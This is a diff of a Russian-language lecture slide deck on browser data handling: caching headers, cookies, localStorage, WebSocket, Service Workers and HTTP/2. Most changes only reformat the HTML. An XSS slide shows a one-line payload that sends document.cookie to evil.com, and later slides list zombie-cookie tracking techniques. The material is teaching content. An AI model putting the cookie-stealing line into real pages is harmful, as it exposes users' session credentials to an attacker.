@@ -23,71 +23,71 @@
 			aspect = ratios[0];
 		}
 
-		if (['localhost', '127.0.0.1'].includes( window.location.hostname )) {
+		if (['localhost', '127.0.0.1'].includes(window.location.hostname)) {
 			aspect = '4x3';
 		}
+		aspect = '4x3';
 
 		document.write(`<link rel="stylesheet" href="/lib/shower/themes/technopark/styles/screen-${aspect}.css">`);
 
-
 	</script>
 
-	<link rel="stylesheet" href="/lib/hljs/styles/github.css">
-
-	<style>
-		.slide pre {
-			font-size: 110%;
-		}
-	</style>
+	<link rel="stylesheet" href="/lib/slides.css">
 
 </head>
 <body class="shower list">
 
-	<header class="caption">
-		<h1>Работа с данными в браузере</h1>
-		<p>Технопарк, 2017 г.</p>
-	</header>
+<header class="caption">
+	<h1>Работа с данными в браузере</h1>
+	<p>Технопарк, 2017 г.</p>
+</header>
 
-	<section class="slide">
-		<h2 class="shout">Работа с данными в браузере<br/>
-			<small style="font-size:32px;">Слайды доступны по ссылке <a href="http://frontend.tech-mail.ru/">frontend.tech-mail.ru</a></small>
-		</h2>
-	</section>
+<section class="slide">
+	<h2 class="shout">Работа с данными в браузере<br/>
+		<small style="font-size:32px;">Слайды доступны по ссылке <a href="http://frontend.tech-mail.ru/">frontend.tech-mail.ru</a>
+		</small>
+	</h2>
+</section>
 
-	<section class="slide">
-		<h2 class="shout"><span style="font-size: 90%">Кэширование, cookies, хранение данных</span></h2>
-	</section>
+<section class="slide">
+	<h2 class="shout"><span style="font-size: 90%">Кэширование, cookies, хранение данных</span></h2>
+</section>
 
-	<section class="slide question">
-		<h2>Кэширование</h2>
-	</section>
+<section class="slide question">
+	<h2>Кэширование</h2>
+</section>
 
-	<section class="slide">
-		<h2>Кэширование</h2>
-		<div style="position:relative;width: 100%; height: 75%;"><img class="place" src="cache.jpg" style="transform-origin: center;transform: translate(-50%,-45%) scale(1);"></div>
-	</section>
+<section class="slide">
+	<h2>Кэширование</h2>
+	<div style="position:relative;width: 100%; height: 75%;"><img class="place" src="cache.jpg"
+																  style="transform-origin: center;transform: translate(-50%,-45%) scale(1);">
+	</div>
+</section>
 
-	<section class="slide">
-		<h2>Кэширование</h2>
-		<blockquote>
-			<p class="small-content"><b>Кэширование</b> &mdash; повторное использование ресурсов для работы приложения. Использование кэшей позволяет уменьшить задержку и расходование сетевого трафика и тем самым уменьшить время, необходимое для отображения ресурса. <b>HTTP-кэширование</b> &mdash; кэширование ответов на HTTP-запросы</p>
-		</blockquote>
-	</section>
+<section class="slide">
+	<h2>Кэширование</h2>
+	<blockquote>
+		<p class="small-content"><b>Кэширование</b> &mdash; повторное использование ресурсов для работы приложения.
+			Использование кэшей позволяет уменьшить задержку и расходование сетевого трафика и тем самым уменьшить
+			время, необходимое для отображения ресурса. <b>HTTP-кэширование</b> &mdash; кэширование ответов на
+			HTTP-запросы</p>
+	</blockquote>
+</section>
 
-	<section class="slide">
-		<h2>Кэширование</h2>
-		<pre class="hljs http">
+<section class="slide">
+	<h2>Кэширование</h2>
+	<pre class="hljs http">
 			<code><span class="comment rus">// Запрос обыкновенный</span></code>
 			<code>GET /script.js HTTP/1.1</code>
 			<code>Host: example.com</code>
 			<code>Accept: */*</code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2>Кэширование</h2>
-		<pre class="hljs http">
+<section class="slide">
+	<h2>Кэширование</h2>
+	<pre class="hljs http">
 			<code><span class="comment rus">// Ответ на запрос</span></code>
 			<code>HTTP/1.1 200 OK</code>
 			<code>Content-Type: application/javascript; charset=UTF-8</code>
@@ -96,23 +96,23 @@
 			<code>ETag: W/"7349b-15b075b6d60"</code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2><code>Cache-Control</code></h2>
-		<p>Возможные значения</p>
-		<ul lang="ru">
-			<li><code>no-cache</code></li>
-			<li><code>no-store</code></li>
-			<li><code>must-revalidate</code></li>
-			<li><code>private/public</code></li>
-			<li><code>max-age=31536000</code></li>
-		</ul>
-	</section>
+<section class="slide">
+	<h2><code>Cache-Control</code></h2>
+	<p>Возможные значения</p>
+	<ul lang="ru">
+		<li><code>no-cache</code></li>
+		<li><code>no-store</code></li>
+		<li><code>must-revalidate</code></li>
+		<li><code>private/public</code></li>
+		<li><code>max-age=31536000</code></li>
+	</ul>
+</section>
 
-	<section class="slide">
-		<h2>Проверка "свежести"</h2>
-		<pre class="hljs http">
+<section class="slide">
+	<h2>Проверка "свежести"</h2>
+	<pre class="hljs http">
 			<code><span class="comment rus">// Ответ на запрос</span></code>
 			<code>HTTP/1.1 200 OK</code>
 			<code>...</code>
@@ -120,26 +120,28 @@
 			<code>...</code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2>Проверка "свежести"</h2>
-		<pre class="hljs http">
+<section class="slide">
+	<h2>Проверка "свежести"</h2>
+	<pre class="hljs http">
 			<code>GET /script.js HTTP/1.1</code>
 			<code>Host: example.com</code>
 			<code>If-Modified-Since: Sat, 25 Mar 2017 12:00:00 GMT</code>
 			<code> </code>
 		</pre>
-		<pre class="hljs http">
+	<pre class="hljs http">
 			<code>HTTP/1.1 304 Not Modified   <span class="comment rus">// Контент не изменился</span></code>
 			<code>HTTP/1.1 200 OK             <span class="comment rus">// Новый контент</span></code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2>Проверка <mark><em>валидности</em></mark></h2>
-		<pre class="hljs http">
+<section class="slide">
+	<h2>Проверка
+		<mark><em>валидности</em></mark>
+	</h2>
+	<pre class="hljs http">
 			<code><span class="comment rus">// Ответ на запрос</span></code>
 			<code>HTTP/1.1 200 OK</code>
 			<code>...</code>
@@ -147,114 +149,121 @@
 			<code>...</code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2>Проверка <mark><em>валидности</em></mark></h2>
-		<pre class="hljs http">
+<section class="slide">
+	<h2>Проверка
+		<mark><em>валидности</em></mark>
+	</h2>
+	<pre class="hljs http">
 			<code>GET /script.js HTTP/1.1</code>
 			<code>Host: example.com</code>
 			<code>If-None-Match: W/"7349b-15b075b6d60"</code>
 			<code> </code>
 		</pre>
-		<pre class="hljs http">
+	<pre class="hljs http">
 			<code>HTTP/1.1 304 Not Modified   <span class="comment rus">// Контент не изменился</span></code>
 			<code>HTTP/1.1 200 OK             <span class="comment rus">// Новый контент</span></code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2>"Управление" кэшированием</h2>
-		<ul>
-			<li><span>Гет-параметр:</span><br><code>GET /script.js?_=1492172324776</code></li>
-			<li><span>Уникальные имена:</span><br><code>GET /bundle.026f8e459c8f89ef75fa7a78265a0025.js</code></li>
-		</ul>
-	</section>
+<section class="slide">
+	<h2>"Управление" кэшированием</h2>
+	<ul>
+		<li><span>Гет-параметр:</span><br><code>GET /script.js?_=1492172324776</code></li>
+		<li><span>Уникальные имена:</span><br><code>GET /bundle.026f8e459c8f89ef75fa7a78265a0025.js</code></li>
+	</ul>
+</section>
 
-	<section class="slide question">
-		<h2>Cookies</h2>
-	</section>
+<section class="slide question">
+	<h2>Cookies</h2>
+</section>
 
-	<section class="slide question">
-		<h2>HTTP is a stateless protocol</h2>
-	</section>
+<section class="slide question">
+	<h2>HTTP is a stateless protocol</h2>
+</section>
 
-	<section class="slide">
-		<h2>Cookies</h2>
-		<div>
-			<blockquote>
-				<p class="small-content"><b>Куки (cookies)</b> &mdash; небольшой фрагмент данных, отправленный веб-сервером и хранимый на компьютере пользователя. Веб-клиент (обычно веб-браузер) всякий раз при попытке открыть страницу соответствующего сайта пересылает этот фрагмент данных веб-серверу в виде HTTP-запроса</p>
-			</blockquote>
-		</div>
-	</section>
+<section class="slide">
+	<h2>Cookies</h2>
+	<div>
+		<blockquote>
+			<p class="small-content"><b>Куки (cookies)</b> &mdash; небольшой фрагмент данных, отправленный веб-сервером
+				и хранимый на компьютере пользователя. Веб-клиент (обычно веб-браузер) всякий раз при попытке открыть
+				страницу соответствующего сайта пересылает этот фрагмент данных веб-серверу в виде HTTP-запроса</p>
+		</blockquote>
+	</div>
+</section>
 
-	<section class="slide">
-		<h2><a href="http://tools.ietf.org/html/rfc2965">Спецификация</a> cookies</h2>
-		<p class="small-content"></p>
-		<ul lang="ru">
-			<li>Браузер должен хранить как минимум 4096 байт кук</li>
-			<li>Минимум 20 шт. на домен</li>
-			<li>Минимум 300 шт. всего</li>
-			<li>Имена <mark>нечувствительны</mark> к регистру</li>
-		</ul>
-	</section>
+<section class="slide">
+	<h2><a href="http://tools.ietf.org/html/rfc2965">Спецификация</a> cookies</h2>
+	<p class="small-content"></p>
+	<ul lang="ru">
+		<li>Браузер должен хранить как минимум 4096 байт кук</li>
+		<li>Минимум 20 шт. на домен</li>
+		<li>Минимум 300 шт. всего</li>
+		<li>Имена
+			<mark>нечувствительны</mark>
+			к регистру
+		</li>
+	</ul>
+</section>
 
-	<section class="slide">
-		<h2>1 Клиент → Сервер</h2>
-		<pre class="hljs http">
+<section class="slide">
+	<h2>1 Клиент → Сервер</h2>
+	<pre class="hljs http">
 			<code>GET / HTTP/1.1</code>
 			<code>Host: example.com</code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2>2 Клиент ← Сервер</h2>
-		<pre class="hljs http">
+<section class="slide">
+	<h2>2 Клиент ← Сервер</h2>
+	<pre class="hljs http">
 			<code>HTTP/1.1 200 OK</code>
 			<code><mark>Set-Cookie: name=value</mark></code>
 			<code>Content-Type: text/html</code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2>3 Клиент → Сервер</h2>
-		<pre class="hljs http">
+<section class="slide">
+	<h2>3 Клиент → Сервер</h2>
+	<pre class="hljs http">
 			<code>GET / HTTP/1.1</code>
 			<code>Host: example.com</code>
 			<code><mark>Cookie: name=value</mark></code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2>4 Клиент ← Сервер</h2>
-		<pre class="hljs http">
+<section class="slide">
+	<h2>4 Клиент ← Сервер</h2>
+	<pre class="hljs http">
 			<code>HTTP/1.1 200 OK</code>
 			<code><mark>Set-Cookie: name=value2</mark></code>
 			<code>Content-Type: text/html</code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2>Использование</h2>
-		<p class="small-content"></p>
-		<ul lang="ru">
-			<li>Аутентификация пользователей</li>
-			<li>Хранение настроек пользователей</li>
-			<li>Отслеживание сеанса (сессия)</li>
-			<li>Сбор статистики</li>
-			<li>Проведение экспериментов</li>
-			<li>etc...</li>
-		</ul>
-	</section>
+<section class="slide">
+	<h2>Использование</h2>
+	<p class="small-content"></p>
+	<ul lang="ru">
+		<li>Аутентификация пользователей</li>
+		<li>Хранение настроек пользователей</li>
+		<li>Отслеживание сеанса (сессия)</li>
+		<li>Сбор статистики</li>
+		<li>Проведение экспериментов</li>
+		<li>etc...</li>
+	</ul>
+</section>
 
-	<section class="slide">
-		<h2>Set-Cookie</h2>
-		<pre class="hljs http">
+<section class="slide">
+	<h2>Set-Cookie</h2>
+	<pre class="hljs http">
 			<code>Set-Cookie: value</code>
 			<code>                 [;<span hidden>X:</span> Expires=date]</code>
 			<code>                 [;<span hidden>X:</span> Max-Age=age]</code>
@@ -264,104 +273,107 @@
 			<code>                 [;<span hidden>X:</span> HttpOnly]</code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2>Cookie ID</h2>
-		<pre class="hljs http">
+<section class="slide">
+	<h2>Cookie ID</h2>
+	<pre class="hljs http">
 			<code>Set-Cookie: name=v1; domain=.example.com; path=/</code>
 			<code>Set-Cookie: name=v2; domain=www.example.com; path=/</code>
 			<code>Set-Cookie: name=v3; domain=.example.com; path=/archive</code>
 			<code> </code>
 		</pre>
-		<pre class="hljs http">
+	<pre class="hljs http">
 			<code>Cookie: name=v1; name=v2; name=v3</code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2>JavaScript</h2>
-		<p class="small-content"></p>
-		<pre class="hljs js">
+<section class="slide">
+	<h2>JavaScript</h2>
+	<p class="small-content"></p>
+	<pre class="hljs js">
 			<code>document.cookie; /* 'name1=value1' */</code>
 			<code class="next">document.cookie = 'name2=value2';</code>
 			<code class="next">document.cookie; /* 'name1=value1; name2=value2' */</code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2><a href="http://en.wikipedia.org/wiki/Cross-site_scripting">Cross Site Scripting</a> (XSS)</h2>
-		<p class="small-content"></p>
-		<pre class="hljs js">
+<section class="slide">
+	<h2><a href="http://en.wikipedia.org/wiki/Cross-site_scripting">Cross Site Scripting</a> (XSS)</h2>
+	<p class="small-content"></p>
+	<pre class="hljs js">
 			<code>(new Image()).src = 'http://evil.com/?cookie=' +</code>
 			<code>                    document.cookie;</code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2>Zombie Cookie</h2>
-		<div>
-			<p class="small-content"></p>
-			<img style="float:left" src="zombie.png">
-			<blockquote>
-				<p><b>What are Zombie Cookies?</b><br/>A zombie cookie is an HTTP cookie that returns to life automatically after being deleted by the user</p>
-			</blockquote>
-		</div>
-	</section>
-
-	<section class="slide">
-		<h2>Zombie Cookie</h2>
-		<div>
-			<ul>
-				<li>Storing cookies in and reading out web history</li>
-				<li>Storing cookies in HTTP ETags</li>
-				<li>Internet Explorer userData storage   (starting IE9, userData is no longer supported)</li>
-				<li>HTML5 Storage</li>
-				<li>Storing cookies in RGB values of auto-generated, force-cached PNGs using HTML5 Canvas tag to read pixels (cookies) back out</li>
-				<li>Local Shared Objects (Flash cookies)</li>
-				<li>Silverlight Isolated Storage</li>
-			</ul>
-		</div>
-	</section>
-
-	<section class="slide">
-		<h2>HSTS Cookie</h2>
-		<p class="small-content">
-			<a href="https://github.com/ben174/hsts-cookie">https://github.com/ben174/hsts-cookie</a>
-		</p>
-	</section>
-
-	<section class="slide question">
-		<h2>Хранение данных</h2>
-	</section>
-
-	<section class="slide">
-		<h2>Хранение данных</h2>
+<section class="slide">
+	<h2>Zombie Cookie</h2>
+	<div>
 		<p class="small-content"></p>
-		<ul lang="ru">
-			<li><code>localStorage</code></li>
-			<li><code>sessionStorage</code></li>
-			<li>WebSQL</li>
-			<li>IndexedDB</li>
-			<li>FileSystem</li>
+		<img style="float:left" src="zombie.png">
+		<blockquote>
+			<p><b>What are Zombie Cookies?</b><br/>A zombie cookie is an HTTP cookie that returns to life automatically
+				after being deleted by the user</p>
+		</blockquote>
+	</div>
+</section>
+
+<section class="slide">
+	<h2>Zombie Cookie</h2>
+	<div>
+		<ul>
+			<li>Storing cookies in and reading out web history</li>
+			<li>Storing cookies in HTTP ETags</li>
+			<li>Internet Explorer userData storage (starting IE9, userData is no longer supported)</li>
+			<li>HTML5 Storage</li>
+			<li>Storing cookies in RGB values of auto-generated, force-cached PNGs using HTML5 Canvas tag to read pixels
+				(cookies) back out
+			</li>
+			<li>Local Shared Objects (Flash cookies)</li>
+			<li>Silverlight Isolated Storage</li>
 		</ul>
-	</section>
+	</div>
+</section>
 
-	<section class="slide">
-		<h2><code>window.localStorage</code></h2>
-		<p class="small-content"></p>
-		<pre class="hljs js">
+<section class="slide">
+	<h2>HSTS Cookie</h2>
+	<p class="small-content">
+		<a href="https://github.com/ben174/hsts-cookie">https://github.com/ben174/hsts-cookie</a>
+	</p>
+</section>
+
+<section class="slide question">
+	<h2>Хранение данных</h2>
+</section>
+
+<section class="slide">
+	<h2>Хранение данных</h2>
+	<p class="small-content"></p>
+	<ul lang="ru">
+		<li><code>localStorage</code></li>
+		<li><code>sessionStorage</code></li>
+		<li>WebSQL</li>
+		<li>IndexedDB</li>
+		<li>FileSystem</li>
+	</ul>
+</section>
+
+<section class="slide">
+	<h2><code>window.localStorage</code></h2>
+	<p class="small-content"></p>
+	<pre class="hljs js">
 			<code>localStorage[key];         <span class="comment rus">/* String */</span></code>
 			<code>localStorage[key] = value; <span class="comment rus">/* String */</span></code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2><code>window.localStorage</code></h2>
-		<pre class="hljs js">
+<section class="slide">
+	<h2><code>window.localStorage</code></h2>
+	<pre class="hljs js">
 			<code>localStorage.length</code>
 			<code>localStorage.key(i)          <span class="comment rus">/* String */</span></code>
 			<code>localStorage.getItem(key)    <span class="comment rus">/* String */</span></code>
@@ -370,22 +382,22 @@
 			<code>localStorage.clear()</code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2>Событие <code>storage</code></h2>
-		<pre class="hljs js">
+<section class="slide">
+	<h2>Событие <code>storage</code></h2>
+	<pre class="hljs js">
 			<code>window.addEventListener('storage', function (e) {</code>
 			<code>    /* e.key, e.newValue */</code>
 			<code>    ...</code>
 			<code>});</code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2>JSON</h2>
-		<pre class="hljs js">
+<section class="slide">
+	<h2>JSON</h2>
+	<pre class="hljs js">
 			<code>function setJSON(key, value) {</code>
 			<code>    localStorage[key] = JSON.stringify(value);</code>
 			<code>}</code>
@@ -395,89 +407,89 @@
 			<code>}</code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2>Хранение данных</h2>
-		<p class="small-content"></p>
-		<ul lang="ru">
-			<li>WebSQL &mdash; 5 MB</li>
-			<li>IndexedDB &mdash; 50 MB</li>
-			<li>FileSystem &mdash; <a href="https://www.w3.org/TR/FileAPI/" target="_blank">File API</a>
-				<ul>
-					<li><a href="https://habrahabr.ru/post/112286/" target="_blank">Статья на Хабре</a></li>
-					<li><a href="https://developer.mozilla.org/ru/docs/Web/API/FileSystem" target="_blank">FileSystem API | MDN</a></li>
-					<li><a href="http://www.htmlfivewow.com/demos/terminal/terminal.html" target="_blank">Терминал в браузере, работающий с файловой системой</a></li>
-				</ul>
-			</li>
-		</ul>
-	</section>
-
-
-
-
+<section class="slide">
+	<h2>Хранение данных</h2>
+	<p class="small-content"></p>
+	<ul lang="ru">
+		<li>WebSQL &mdash; 5 MB</li>
+		<li>IndexedDB &mdash; 50 MB</li>
+		<li>FileSystem &mdash; <a href="https://www.w3.org/TR/FileAPI/" target="_blank">File API</a>
+			<ul>
+				<li><a href="https://habrahabr.ru/post/112286/" target="_blank">Статья на Хабре</a></li>
+				<li><a href="https://developer.mozilla.org/ru/docs/Web/API/FileSystem" target="_blank">FileSystem API |
+					MDN</a></li>
+				<li><a href="http://www.htmlfivewow.com/demos/terminal/terminal.html" target="_blank">Терминал в
+					браузере, работающий с файловой системой</a></li>
+			</ul>
+		</li>
+	</ul>
+</section>
 
 
+<section class="slide">
+	<h2 class="shout">Протокол WebSocket</h2>
+</section>
 
-	<section class="slide">
-		<h2 class="shout">Протокол WebSocket</h2>
-	</section>
+<section class="slide">
+	<h2>WebSocket</h2>
+	<blockquote>
+		<p class="small-content"><strong>WebSockets</strong> &mdash; продвинутая технология, позволяющая открыть
+			постоянное двунаправленное сетевое соединение между браузером пользователя и сервером. С помощью его API вы
+			можете отправить сообщение на сервер и получить ответ без выполнения http запроса, причем этот процесс будет
+			событийно-управляемым</p>
+	</blockquote>
+</section>
 
-	<section class="slide">
-		<h2>WebSocket</h2>
-		<blockquote>
-			<p class="small-content"><strong>WebSockets</strong> &mdash; продвинутая технология, позволяющая открыть постоянное двунаправленное сетевое соединение между браузером пользователя и сервером. С помощью его API вы можете отправить сообщение на сервер и получить ответ без выполнения http запроса, причем этот процесс будет событийно-управляемым</p>
-		</blockquote>
-	</section>
-
-	<section class="slide">
-		<h2>Создание <code>WebSocket</code></h2>
-		<p class="small-content"></p>
-		<pre class="hljs js">
+<section class="slide">
+	<h2>Создание <code>WebSocket</code></h2>
+	<p class="small-content"></p>
+	<pre class="hljs js">
 			<code>const ws = new WebSocket('ws://example.com/ws');</code>
 			<code> </code>
 			<code><span class="comment rus">// если страница загружена по https://</span></code>
 			<code>const ws = new WebSocket('wss://example.com/ws');</code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2>События <code>WebSocket</code></h2>
-		<p class="small-content"></p>
-		<ul>
-			<li><code>open</code></li>
-			<li><code>close</code></li>
-			<li><code>message</code></li>
-			<li><code>error</code></li>
-		</ul>
-	</section>
+<section class="slide">
+	<h2>События <code>WebSocket</code></h2>
+	<p class="small-content"></p>
+	<ul>
+		<li><code>open</code></li>
+		<li><code>close</code></li>
+		<li><code>message</code></li>
+		<li><code>error</code></li>
+	</ul>
+</section>
 
-	<section class="slide">
-		<h2>Событие <code>open</code></h2>
-		<p class="small-content"></p>
-		<pre class="hljs js">
+<section class="slide">
+	<h2>Событие <code>open</code></h2>
+	<p class="small-content"></p>
+	<pre class="hljs js">
 			<code>ws.onopen = function() {</code>
 			<code>      console.log('Соединение установлено');</code>
 			<code>};</code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2>Событие <code>error</code></h2>
-		<p class="small-content"></p>
-		<pre class="hljs js">
+<section class="slide">
+	<h2>Событие <code>error</code></h2>
+	<p class="small-content"></p>
+	<pre class="hljs js">
 			<code>ws.onerror = function(error) {</code>
 			<code>      console.log('Ошибка ' + error.message);</code>
 			<code>};</code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2>Событие <code>close</code></h2>
-		<pre class="hljs js">
+<section class="slide">
+	<h2>Событие <code>close</code></h2>
+	<pre class="hljs js">
 			<code>ws.onclose = function(event) {</code>
 			<code>      <span class="comment rus">// 1000 - штатное закрытие сокета</span></code>
 			<code>      <span class="comment rus">// 1001 - удалённая сторона исчезла</span></code>
@@ -488,11 +500,11 @@
 			<code>};</code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2>Событие <code>message</code></h2>
-		<pre class="hljs js">
+<section class="slide">
+	<h2>Событие <code>message</code></h2>
+	<pre class="hljs js">
 			<code>ws.onmessage = function(event) {</code>
 			<code>      const data = event.data;</code>
 			<code>      const message = JSON.parse(data);</code>
@@ -501,21 +513,21 @@
 			<code>};</code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2>Отправка сообщений</h2>
-		<p class="small-content"></p>
-		<pre class="hljs js">
+<section class="slide">
+	<h2>Отправка сообщений</h2>
+	<p class="small-content"></p>
+	<pre class="hljs js">
 			<code><span class="comment rus">// Отправка текста</span></code>
 			<code>ws.send('Hello!');</code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2>Отправка сообщений</h2>
-		<pre class="hljs js">
+<section class="slide">
+	<h2>Отправка сообщений</h2>
+	<pre class="hljs js">
 			<code><span class="comment rus">// Отправка JSON</span></code>
 			<code>const message = JSON.stringify({</code>
 			<code>      text = 'Hello, world!';</code>
@@ -524,83 +536,86 @@
 			<code>ws.send(message);</code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2>Отправка сообщений</h2>
-		<p class="small-content"></p>
-		<pre class="hljs js">
+<section class="slide">
+	<h2>Отправка сообщений</h2>
+	<p class="small-content"></p>
+	<pre class="hljs js">
 			<code><span class="comment rus">// Отправка файла</span></code>
 			<code>ws.send(form.elements[0].file);</code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2>Преимущества использования</h2>
-		<p class="small-content"></p>
-		<ul>
-			<li>Низкий overhead</li>
-			<li>Полнодуплексный протокол</li>
-			<li>Событийно ориентированный протокол</li>
-			<li>Хорошая поддержка</li>
-		</ul>
-	</section>
-
-
+<section class="slide">
+	<h2>Преимущества использования</h2>
+	<p class="small-content"></p>
+	<ul>
+		<li>Низкий overhead</li>
+		<li>Полнодуплексный протокол</li>
+		<li>Событийно ориентированный протокол</li>
+		<li>Хорошая поддержка</li>
+	</ul>
+</section>
 
 
+<section class="slide">
+	<h2 class="shout">Service Workers</h2>
+</section>
 
+<section class="slide">
+	<h2>Service Workers</h2>
+	<blockquote>
+		<p class="small-content"><strong>Service Workers</strong> &mdash; ещё более продвинутая технология, которая
+			позволяет получить полный контроль над жизненным циклом приложения. Сервис воркер &mdash; это воркер,
+			который работает в выделенном контексте и имеет доступ к Cache Storage, имеет возможность перехватывать
+			запросы, отправляемые страницей, а так же может работать даже если само приложение не запущено</p>
+	</blockquote>
+</section>
 
-	<section class="slide">
-		<h2 class="shout">Service Workers</h2>
-	</section>
+<section class="slide">
+	<h2>Service Workers</h2>
+	<ul>
+		<li>Кэширование данных (50MB+)</li>
+		<li>Оффлайн-работа приложения</li>
+		<li>Фоновая синхронизация данных</li>
+		<li>Ответ на запросы от других источников</li>
+		<li>Улучшение производительности</li>
+		<li>Push-нотификации</li>
+		<li>Распараллеливание вычислений</li>
+		<li>etc...</li>
+	</ul>
+</section>
 
-	<section class="slide">
-		<h2>Service Workers</h2>
-		<blockquote>
-			<p class="small-content"><strong>Service Workers</strong> &mdash; ещё более продвинутая технология, которая позволяет получить полный контроль над жизненным циклом приложения. Сервис воркер &mdash; это воркер, который работает в выделенном контексте и имеет доступ к Cache Storage, имеет возможность перехватывать запросы, отправляемые страницей, а так же может работать даже если само приложение не запущено</p>
-		</blockquote>
-	</section>
+<section class="slide">
+	<h2>Service Workers</h2>
+	<div style="position:relative;width: 100%;height: 75%;margin: 0 auto;"><img class="place" src="swcaniuse.png"
+																				style="transform-origin: center;transform: translate(-50.4%,-50%) scale(0.8);">
+	</div>
+</section>
 
-	<section class="slide">
-		<h2>Service Workers</h2>
-		<ul>
-			<li>Кэширование данных (50MB+)</li>
-			<li>Оффлайн-работа приложения</li>
-			<li>Фоновая синхронизация данных</li>
-			<li>Ответ на запросы от других источников</li>
-			<li>Улучшение производительности</li>
-			<li>Push-нотификации</li>
-			<li>Распараллеливание вычислений</li>
-			<li>etc...</li>
-		</ul>
-	</section>
+<section class="slide">
+	<h2>Service Workers</h2>
+	<p class="medium-content">Работает в специальном скоупе <code>ServiceWorkerGlobalScope</code><br>События</p>
+	<ul>
+		<li><code>install</code></li>
+		<li><code>activate</code></li>
+		<li><code>fetch</code></li>
+		<li><code>message</code></li>
+	</ul>
+</section>
 
-	<section class="slide">
-		<h2>Service Workers</h2>
-		<div style="position:relative;width: 100%;height: 75%;margin: 0 auto;"><img class="place" src="swcaniuse.png" style="transform-origin: center;transform: translate(-50.4%,-50%) scale(0.8);"></div>
-	</section>
+<section class="slide">
+	<h2>Service Worker lifecycle</h2>
+	<div style="position:relative;width: 100%;height: 75%;margin: 0 auto;"><img class="place" src="sw-lifecycle.png"
+																				style="transform-origin: center;transform: translate(-56%,-50%) scale(0.85);">
+	</div>
+</section>
 
-	<section class="slide">
-		<h2>Service Workers</h2>
-		<p class="medium-content">Работает в специальном скоупе <code>ServiceWorkerGlobalScope</code><br>События</p>
-		<ul>
-			<li><code>install</code></li>
-			<li><code>activate</code></li>
-			<li><code>fetch</code></li>
-			<li><code>message</code></li>
-		</ul>
-	</section>
-
-	<section class="slide">
-		<h2>Service Worker lifecycle</h2>
-		<div style="position:relative;width: 100%;height: 75%;margin: 0 auto;"><img class="place" src="sw-lifecycle.png" style="transform-origin: center;transform: translate(-56%,-50%) scale(0.85);"></div>
-	</section>
-
-	<section class="slide">
-		<h2>Установка Service Worker'а</h2>
-		<pre class="hljs js">
+<section class="slide">
+	<h2>Установка Service Worker'а</h2>
+	<pre class="hljs js">
 			<code>navigator.serviceWorker.register('/sw.js', { scope: '/' })</code>
 			<code>    .then(function(registration) {</code>
 			<code>        // Registration was successful</code>
@@ -613,11 +628,11 @@
 			<code>});</code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
-	<section class="slide">
-		<h2>Service Worker &mdash; это просто файл</h2>
-		<pre class="hljs js">
+<section class="slide">
+	<h2>Service Worker &mdash; это просто файл</h2>
+	<pre class="hljs js">
 			<code>this.addEventListener('install', function (event) {</code>
 			<code>    console.log('Service worker установлен')</code>
 			<code>    event.waitUntil(</code>
@@ -631,286 +646,380 @@
 			<code>});</code>
 			<code> </code>
 		</pre>
-	</section>
+</section>
 
 
+<section class="slide">
+	<h2 class="shout">HTTP/2</h2>
+</section>
 
+<section class="slide">
+	<h2>Original HTTP/0.9 implementation</h2>
+	<iframe src="https://www.w3.org/Protocols/HTTP/AsImplemented.html" frameborder="0" width="100%"
+			height="80%"></iframe>
+</section>
 
+<section class="slide">
+	<h2>Hypertext Transfer Protocol: HTTP/1.1</h2>
+	<div style="position:relative;width: 100%;height: 100%;overflow: hidden;margin: 0 auto;">
+		<iframe src="https://rfc2.ru/2068.rfc/original" frameborder="0" width="100%" height="80%"
+				style="transform-origin: center;transform: translate(10%,-10%) scale(1.2)"></iframe>
+	</div>
+</section>
 
-	<section class="slide">
-		<h2 class="shout">HTTP/2</h2>
-	</section>
+<section class="slide">
+	<h2>HTTP/1.1</h2>
+	<p style="line-height: 1.3em">HTTP/1.1 was designed for connections and bandwidth that are significantly different
+		today</p>
+	<ul lang="ru">
+		<li>
+			<mark>Single parallel</mark>
+			request per connection
+		</li>
+		<li>Max. 10 connections
+			<mark>per domain</mark>
+		</li>
+		<li>Exclusively
+			<mark>client-imitated</mark>
+			requests
+		</li>
+		<li>
+			<mark>Uncompressed and redundant</mark>
+			request and response headers
+		</li>
+		<li>
+			<mark>Optional</mark>
+			data compression
+		</li>
+		<li>HTTP is
+			<mark>slow</mark>
+			, but HTTPS is
+			<mark>even slower</mark>
+		</li>
+	</ul>
+</section>
 
-	<section class="slide">
-		<h2>Original HTTP/0.9 implementation</h2>
